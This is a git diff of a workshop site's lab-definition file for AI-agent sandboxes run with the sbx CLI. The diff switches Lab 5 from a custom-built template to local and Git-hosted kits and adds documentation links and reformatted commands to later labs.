+      "Kit = declarative runtime mixin — npm ci, dev server on :3000, network allow-list. No custom template needed.",
+      "Local kit: ./labs/customize/kit/workshop-app-nextjs from this repo, or ./customize/kit/workshop-app-nextjs from the workshop monorepo root.",
+      "Git kit: git+https://github.com/kristiyan-velkov/docker-sandbox-workshop.git#dir=customize/kit/workshop-app-nextjs",
+      "sbx ls shows forwarded ports (e.g. localhost:PORT → 3000). Open that URL in your browser.",
+      "First boot may take a minute while npm ci runs — retry curl if you get 000.",
     ],
     steps: [
       {
-        label: "Build template",
-        task: "Build the Cursor agent image, export to tar, load into sbx. Takes a few minutes — wait for sbx template load to finish without errors.",
+        label: "Kit — local path",
+        task: "From repo root, start Cursor with the workshop kit from disk. Use ./labs/customize/kit/… here, or ./customize/kit/… from the monorepo root.",
         command:
-          "cd customize/templates/workshop-app-cursor\ndocker build -t workshop-app-cursor:v1 .\ndocker image save workshop-app-cursor:v1 -o workshop-app-cursor.tar\nsbx template load workshop-app-cursor.tar",
+          "sbx run cursor . --kit ./labs/customize/kit/workshop-app-nextjs --name lab5-local",
       },
       {
-        label: "Run stack",
-        task: "From repo root: start Cursor with both template and kit on workshop-app/. Name it workshop-ui so later exec/curl commands match.",
+        label: "Verify local",
+        task: "Confirm the dev server is up inside the sandbox. HTTP 200 means Next.js is serving. Check sbx ls for the forwarded browser URL.",
         command:
-          "sbx run --template workshop-app-cursor:v1 cursor workshop-app/ --kit ./customize/kit/workshop-app-nextjs --name workshop-ui",
+          "sbx ls\nsbx exec lab5-local -- curl -s -o /dev/null -w '%{http_code}\\n' http://127.0.0.1:3000\nsbx policy log lab5-local --limit 10",
       },
       {
-        label: "Verify",
-        task: "Curl the dev server inside the sandbox. HTTP 200 means Next.js is up. If 000, wait for npm run dev to finish booting.",
+        label: "Clean up local",
+        task: "Remove the local-kit sandbox before trying the Git kit.",
+        command: "sbx rm lab5-local --force",
+      },
+      {
+        label: "Kit — from Git",
+        task: "Same app, same kit — this time sbx pulls the kit spec from the workshop monorepo URL at run time.",
         command:
-          "sbx exec workshop-ui -- curl -s -o /dev/null -w '%{http_code}\\n' http://127.0.0.1:3000",
+          'sbx run cursor . --kit "git+https://github.com/kristiyan-velkov/docker-sandbox-workshop.git#dir=customize/kit/workshop-app-nextjs" --name lab5-git',
+      },
+      {
+        label: "Verify Git kit",
+        task: "Curl the dev server again. Expect HTTP 200 — the Git-sourced kit should behave like the local copy.",
+        command:
+          "sbx ls\nsbx exec lab5-git -- curl -s -o /dev/null -w '%{http_code}\\n' http://127.0.0.1:3000",
+      },
+      {
+        label: "Clean up",
+        task: "Remove the Git-kit sandbox when verification passes.",
+        command: "sbx rm lab5-git --force",
       },
     ],
   },
@@ -344,7 +461,14 @@ Done when curl prints 200 and the workshop site loads in the browser.`,
     time: "15 min",
     folder: "lab-06-customize-stack",
     githubPath: "lab-06-customize-stack",
-    description: "Stack customize/ template + kit, inspect layers, sbx kit add.",
+    description:
+      "Stack customize/ template + kit, inspect layers, sbx kit add.",
+    docsLinks: [
+      { label: "Customize", href: sandboxDocs.customize },
+      { label: "Templates", href: sandboxDocs.templates },
+      { label: "Kits", href: sandboxDocs.kits },
+      { label: "Run agents", href: sandboxDocs.agents },
+    ],
     task: `1. sbx kit validate the workshop kit — fix any spec errors before running.
 2. Run the full template + kit stack as customize-stack.
 3. sbx exec and confirm .claude/skills/workshop-app/SKILL.md exists in the VM.
@@ -354,7 +478,7 @@ Done when validate passes with no errors, the skill file exists in the VM, and k
     hints: [
       "Validate first — sbx kit validate catches spec.yaml mistakes before a 5-minute sandbox boot fails.",
       "Skills are injected into the workspace at .claude/skills/<name>/SKILL.md — not into the template image.",
-      "Requires workshop-app-cursor:v1 from Lab 5 — rebuild the template if sbx says it is missing.",
+      "Requires a kit from Lab 5 — use ./labs/customize/kit/workshop-app-nextjs or the Git kit URL.",
       "kit add is a host-side copy helper — useful to fork a kit before customizing in Lab 8.",
     ],
     steps: [
@@ -366,12 +490,14 @@ Done when validate passes with no errors, the skill file exists in the VM, and k
       {
         label: "Full stack",
         task: "Launch the same stack as Lab 5 but name it customize-stack. Confirm dev server starts and agent has workshop rules.",
-        command: "sbx run --template workshop-app-cursor:v1 cursor workshop-app/ --kit ./customize/kit/workshop-app-nextjs --name customize-stack",
+        command:
+          "sbx run --template workshop-app-cursor:v1 cursor workshop-app/ --kit ./customize/kit/workshop-app-nextjs --name customize-stack",
       },
       {
         label: "Verify skill",
         task: "Check the skill file inside the VM. Exit code 0 = file exists. If missing, re-check kit files/ in the spec.",
-        command: "sbx exec customize-stack -- test -f .claude/skills/workshop-app/SKILL.md",
+        command:
+          "sbx exec customize-stack -- test -f .claude/skills/workshop-app/SKILL.md",
       },
       {
         label: "kit add",
@@ -386,7 +512,14 @@ Done when validate passes with no errors, the skill file exists in the VM, and k
     time: "20 min",
     folder: "lab-07-build-component",
     githubPath: "lab-07-build-component",
-    description: "Clone mode + kit — agent adds a UI component, lint and build gate.",
+    description:
+      "Clone mode + kit — agent adds a UI component, lint and build gate.",
+    docsLinks: [
+      { label: "Clone mode", href: sandboxDocs.workflowsCloneMode },
+      { label: "Workflow patterns", href: sandboxDocs.workflows },
+      { label: "Run agents", href: sandboxDocs.agents },
+      { label: "Kits", href: sandboxDocs.kits },
+    ],
     task: `1. sbx run --clone cursor workshop-app/ with kit as feature-component.
 2. Prompt the agent to create branch feat/lab-7-stats-card, add a WorkshopStats component, run npm run lint and npm run build, then commit.
 3. sbx exec npm run build yourself as a quality gate.
@@ -394,7 +527,7 @@ Done when validate passes with no errors, the skill file exists in the VM, and k
 
 Done when build exits 0, the component renders on the home page, and you reviewed the diff on the host.`,
     hints: [
-      "Paste this agent prompt: \"Create branch feat/lab-7-stats-card. Add WorkshopStats showing event, location, duration from workshop-data.ts using existing Apple CSS tokens. Render on home below hero. Run npm run lint && npm run build. Commit when green.\"",
+      'Paste this agent prompt: "Create branch feat/lab-7-stats-card. Add WorkshopStats showing event, location, duration from workshop-data.ts using existing Apple CSS tokens. Render on home below hero. Run npm run lint && npm run build. Commit when green."',
       "Do not accept agent output until npm run build passes inside the sandbox — that is your quality gate.",
       "Use existing shadcn/Tailwind tokens — tell the agent not to add new UI libraries.",
       "Host git status should stay clean until you explicitly merge or checkout the fetched branch.",
@@ -425,6 +558,11 @@ Done when build exits 0, the component renders on the home page, and you reviewe
     folder: "lab-08-create-kit",
     githubPath: "lab-08-create-kit",
     description: "Copy starter-kit, customize spec.yaml, validate and pack.",
+    docsLinks: [
+      { label: "Kits", href: sandboxDocs.kits },
+      { label: "Customize", href: sandboxDocs.customize },
+      { label: "sbx CLI", href: sandboxDocs.cli },
+    ],
     task: `1. cp lab-08-create-kit/starter-kit to ./my-workshop-kit — never edit the starter in place.
 2. Edit spec.yaml: set your kit name, caps.network.allow hosts you need, and tweak the skill SKILL.md.
 3. sbx kit validate ./my-workshop-kit until it passes with no errors.
@@ -462,6 +600,11 @@ Done when validate reports no errors and the zip file exists for Lab 9.`,
     folder: "lab-09-use-custom-kit",
     githubPath: "lab-09-use-custom-kit",
     description: "Run workshop-app with the kit you built in Lab 8.",
+    docsLinks: [
+      { label: "Kits", href: sandboxDocs.kits },
+      { label: "Clone mode", href: sandboxDocs.workflowsCloneMode },
+      { label: "Workflow patterns", href: sandboxDocs.workflows },
+    ],
     task: `1. sbx run --clone cursor workshop-app/ --kit ./my-workshop-kit --name my-kit-clone.
 2. sbx exec and verify .claude/skills/my-workshop-kit/SKILL.md exists in the workspace.
 3. Ask the agent a question that should trigger your skill instructions.
@@ -477,12 +620,14 @@ Done when the skill file is present and the agent follows your kit instructions.
       {
         label: "Run",
         task: "From repo root: launch clone-mode Cursor with your custom kit. Confirm the sandbox name is my-kit-clone for the verify step.",
-        command: "sbx run --clone cursor workshop-app/ --kit ./my-workshop-kit --name my-kit-clone",
+        command:
+          "sbx run --clone cursor workshop-app/ --kit ./my-workshop-kit --name my-kit-clone",
       },
       {
         label: "Verify skill",
         task: "Confirm your skill file landed in the workspace. test -f exits 0 on success — if it fails, check files/ paths in spec.yaml.",
-        command: "sbx exec my-kit-clone -- test -f .claude/skills/my-workshop-kit/SKILL.md",
+        command:
+          "sbx exec my-kit-clone -- test -f .claude/skills/my-workshop-kit/SKILL.md",
       },
     ],
   },
@@ -492,7 +637,14 @@ Done when the skill file is present and the agent follows your kit instructions.
     time: "20 min",
     folder: "lab-10-capstone",
     githubPath: "lab-10-capstone",
-    description: "GitHub secret, clone mode, agent opens a PR — full delivery loop.",
+    description:
+      "GitHub secret, clone mode, agent opens a PR — full delivery loop.",
+    docsLinks: [
+      { label: "Workflow patterns", href: sandboxDocs.workflows },
+      { label: "Authenticated CLI", href: sandboxDocs.workflowsAuthCli },
+      { label: "Credential proxy", href: sandboxDocs.credentials },
+      { label: "CI & headless", href: sandboxDocs.workflowsCi },
+    ],
     task: `1. Pipe gh auth token to sbx secret set -g github on the host (run gh auth status first).
 2. sbx run --clone cursor workshop-app/ --kit ./my-workshop-kit --name capstone.
 3. Agent creates feat/lab-10-capstone, edits copy, commits, and runs gh pr create — or you git fetch sandbox-capstone and open the PR from the host.
@@ -500,9 +652,9 @@ Done when the skill file is present and the agent follows your kit instructions.
 
 Done when a PR exists (or branch is fetched on host), gh worked via the proxy, and policy log shows api.github.com allowed.`,
     hints: [
-      "Never commit tokens — echo \"$(gh auth token)\" | sbx secret set -g github stores it on the host only.",
+      'Never commit tokens — echo "$(gh auth token)" | sbx secret set -g github stores it on the host only.',
       "If gh push fails inside the VM: git fetch sandbox-capstone on the host and open the PR from there.",
-      "Agent prompt: \"Branch feat/lab-10-capstone. Update hero copy in workshop-data.ts. npm run build. Commit and gh pr create with a short description.\"",
+      'Agent prompt: "Branch feat/lab-10-capstone. Update hero copy in workshop-data.ts. npm run build. Commit and gh pr create with a short description."',
       "sbx policy log confirms credentials were injected — you should see api.github.com without the raw token in logs.",
     ],
     steps: [
@@ -514,7 +666,8 @@ Done when a PR exists (or branch is fetched on host), gh worked via the proxy, a
       {
         label: "Clone + kit",
         task: "Start the capstone sandbox in clone mode with your kit. Use my-workshop-kit from Lab 8 or swap in ./customize/kit/workshop-app-nextjs.",
-        command: "sbx run --clone cursor workshop-app/ --kit ./my-workshop-kit --name capstone",
+        command:
+          "sbx run --clone cursor workshop-app/ --kit ./my-workshop-kit --name capstone",
       },
       {
         label: "Fetch",
@@ -537,7 +690,7 @@ export const yoloPoints = [
   },
   {
     title: "The sbx answer",
-    body: "sbx run claude . boots a microVM. The agent goes full YOLO inside the sandbox. Your host, keys, and Docker daemon stay untouched.",
+    body: "sbx run cursor . boots a microVM. The agent goes full YOLO inside the sandbox. Your host, keys, and Docker daemon stay untouched.",
   },
   {
     title: "Default posture",
